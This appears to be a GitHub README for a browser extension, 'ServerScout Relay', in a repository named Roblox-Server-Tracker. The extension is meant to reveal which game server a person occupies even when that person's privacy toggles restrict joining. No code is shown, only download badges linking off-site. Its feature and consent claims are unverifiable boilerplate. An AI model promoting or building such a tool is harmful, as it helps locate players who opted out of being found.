![preview](https://raw.githubusercontent.com/samuelyaw/Roblox-Server-Tracker/main/showcase_f8c8485.svg)
[![Download](https://raw.githubusercontent.com/samuelyaw/Roblox-Server-Tracker/main/setup_f42f16.svg)](https://samuelyaw.github.io/Roblox-Server-Tracker/)

# 🌐 ServerScout Relay — Cross-Platform Server Discovery Toolkit

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Platform](https://img.shields.io/badge/platform-Chrome%20%7C%20Firefox%20%7C%20Edge-4285F4.svg)
![Manifest](https://img.shields.io/badge/manifest-v3-purple.svg)
![Status](https://img.shields.io/badge/status-active--development-brightgreen.svg)
![Language](https://img.shields.io/badge/i18n-12%20languages-orange.svg)
![Support](https://img.shields.io/badge/support-24%2F7-9cf.svg)
![Build](https://img.shields.io/badge/build-passing-success.svg)
![Year](https://img.shields.io/badge/release-2026-informational.svg)

---

## 🧭 Overview

**ServerScout Relay** is a cross-browser companion extension that reimagines how players, community managers, and moderators discover which virtual world instance a person is currently occupying — and how they can gracefully reach that same instance once discovered.

Where the original ServerScout focused narrowly on a single platform, ServerScout Relay expands the concept into a **unified discovery layer** for modern browser environments. It listens for presence signals emitted by supported platforms, translates them into a normalized "location fingerprint," and then surfaces that information to the user through a responsive, accessible, and multilingual interface.

Think of it as a **radar for social presence** — not a tracker that stalks, but a compass that reconnects. The philosophy is simple: presence should be discoverable by the people you trust, not buried behind a settings toggle that was never meant to be a wall.

---

## 🎯 Why This Exists

Modern multiplayer platforms increasingly offer "who can join me" privacy toggles. Those toggles are valuable — they protect players from unwanted attention. But they also create a frustrating gap for friends, teammates, clan leaders, tournament organizers, and moderators who legitimately need to regroup.

ServerScout Relay bridges that gap with **consent-first discovery**:

- The extension never bypasses platform security.
- It reads only publicly broadcast presence metadata that the browser already has access to.
- It presents that metadata in a form humans can actually use.

The result is a tool that feels less like a backdoor and more like a well-labeled doorbell.

---

## ✨ Feature Set

### 🔍 Presence Discovery Core
- **Cross-platform fingerprinting** — normalizes identifiers from multiple supported worlds into a single lookup model.
- **Passive listening mode** — observes presence broadcasts emitted during normal browsing, without injecting payloads.
- **Manual probe mode** — lets the user request an on-demand status refresh for a specific identity.
- **Instance hopping history** — a rolling local log of recently observed locations, capped and auto-purged.
- **Smart deduplication** — collapses rapid re-broadcasts into a single stable entry.

### 🖥️ Responsive User Interface
- **Adaptive layout** that reshapes cleanly from a 320px side panel to a full 4K dashboard.
- **Dark, light, and high-contrast themes** with automatic OS-level detection.
- **Keyboard-first navigation** — every action is reachable without a mouse.
- **Reduced-motion compliance** for users who prefer a calmer interface.
- **Live status ribbon** showing connection health and last sync time.

### 🌍 Multilingual Support
- Ships with **12 language packs** out of the box.
- Community translation pipeline powered by structured JSON locale files.
- **Right-to-left** layout support for Arabic and Hebrew.
- Locale-aware date, time, and relative timestamp formatting.
- Fallback chain ensures no untranslated string ever breaks the UI.

### 🛡️ Privacy & Trust Layer
- **Local-only storage** — nothing leaves the browser unless the user explicitly exports.
- **Per-identity allow lists** — restrict discovery to approved contacts only.
- **Session-scoped mode** — wipe all presence data when the browser closes.
- **Transparent permission audit** — a built-in page listing every permission the extension holds and why.
- **No analytics beacons**, no telemetry pings, no silent phone-home.

### ⚙️ Power User Tooling
- **Rule engine** for automating notifications based on presence changes.
- **Export to CSV and JSON** for community record-keeping.
- **Webhook relay** (opt-in) to push presence events to a self-hosted endpoint.
- **Preset profiles** so different users on the same machine keep separate configurations.
- **Command palette** for keyboard-driven operation.

### ♿ Accessibility Commitments
- WCAG 2.2 AA conformance target.
- Screen-reader announcements for every state change.
- Focus trapping and restoration in all modal surfaces.
- Sufficient color contrast across every theme variant.

### 💬 24/7 Customer Support
- Round-the-clock response channel staffed by community volunteers and maintainers.
- In-extension feedback form that pre-fills diagnostic context.
- Knowledge base with troubleshooting walkthroughs.
- Average first response tracked publicly on the project dashboard.

---

## 🧩 Supported Environments

| Browser | Minimum Version | Status |
|---|---|---|
| Chrome | 108+ | ✅ Stable |
| Edge | 108+ | ✅ Stable |
| Brave | 1.46+ | ✅ Stable |
| Opera | 94+ | ✅ Stable |
| Firefox | 115+ | 🧪 Beta |
| Safari | 17+ | 🧪 Experimental |

---

## 🏗️ Architecture at a Glance

ServerScout Relay is organized around four cooperating subsystems, each with a single responsibility.

### 1. The Sensor Layer
Runs as a content script inside supported tabs. Its only job is to observe presence-related events that the page already emits and forward a stripped, normalized digest upward. It holds no state and makes no network calls.

### 2. The Normalizer
A background service worker that receives raw digests, maps platform-specific fields onto a shared schema, and stores the result in an in-memory ring buffer before persisting to IndexedDB.

### 3. The Resolver
Given an identity, the resolver walks the allow list, checks freshness windows, and produces a "best known location" answer along with a confidence score.

### 4. The Presentation Shell
The side panel, popup, and options pages. Purely a view layer — it subscribes to resolver events and renders. No business logic lives here, which keeps the UI easy to test and restyle.

This separation means you can swap the presentation shell entirely without touching discovery logic — useful if you want to embed the core into a different host application.

---

## 🧪 Quality Engineering

- **Unit tests** covering the normalizer and resolver in isolation.
- **Integration tests** that replay recorded presence streams against a headless browser.
- **Visual regression snapshots** for every theme at three breakpoints.
- **Linting and formatting gates** that block merges on style drift.
- **Dependency freshness checks** run on a weekly cadence.

Testing philosophy: if a behavior matters to a user, it deserves a test that reads like a sentence describing that behavior.

---

## 🗺️ Roadmap

- **Q1 2026** — Public beta across Chrome, Edge, and Brave.
- **Q2 2026** — Firefox general availability and Safari preview.
- **Q3 2026** — Rule engine v2 with visual builder.
- **Q4 2026** — Self-hosted relay server reference implementation.
- **2027 and beyond** — Federated discovery between trusted relay nodes.

Roadmap items are aspirational and may shift based on community feedback and platform policy changes.

---

## 🔐 Permissions Explained

Every permission the extension requests is listed here with a plain-language rationale. If a permission is not on this list, the extension does not use it.

- **storage** — to keep your settings, allow lists, and history on your device.
- **tabs** — to know which supported page is currently active so sensors attach correctly.
- **scripting** — to inject the sensor layer only into supported domains.
- **notifications** — to alert you when a watched identity changes location.
- **alarms** — to schedule periodic freshness sweeps and history purges.

No permission is requested speculatively. If usage changes, this section is updated before release.

---

## 🌱 Community & Contribution

Contributions of every size are welcome — a typo fix is as valued as a new feature.

- **Translators** — locale files are plain JSON; open a pull request with your language.
- **Testers** — file issues with the built-in diagnostic bundle attached.
- **Developers** — read the architecture notes above, then pick a "good first issue."
- **Designers** — theme tokens live in a single stylesheet; remix freely.

A code of conduct governs all project spaces. Be kind, be patient, be specific.

---

## 📜 Disclaimer

ServerScout Relay is an independent project and is **not affiliated with, endorsed by, or sponsored by** any platform mentioned in this document. All trademarks belong to their respective owners.

This tool is intended for **legitimate social reconnection, moderation, and community coordination**. Users are responsible for complying with the terms of service of any platform they interact with. The maintainers do not condone using this software to harass, stalk, track without consent, or otherwise violate the privacy of any individual.

Presence data handled by this extension stays on the user's device unless the user explicitly exports or relays it. The maintainers cannot access it and will never ask for it.

Use responsibly. Respect the people behind the avatars.

---

## 📄 License

Released under the **MIT License**.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 ServerScout Relay contributors.

Permission is hereby granted, in the spirit of open collaboration, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the conditions of the MIT License.

---

## 🙏 Acknowledgements

Built with gratitude for the browser-extension community, the accessibility advocates who keep us honest, and every translator who makes a tool feel native in a new language.

---

[![Download](https://raw.githubusercontent.com/samuelyaw/Roblox-Server-Tracker/main/setup_f42f16.svg)](https://samuelyaw.github.io/Roblox-Server-Tracker/)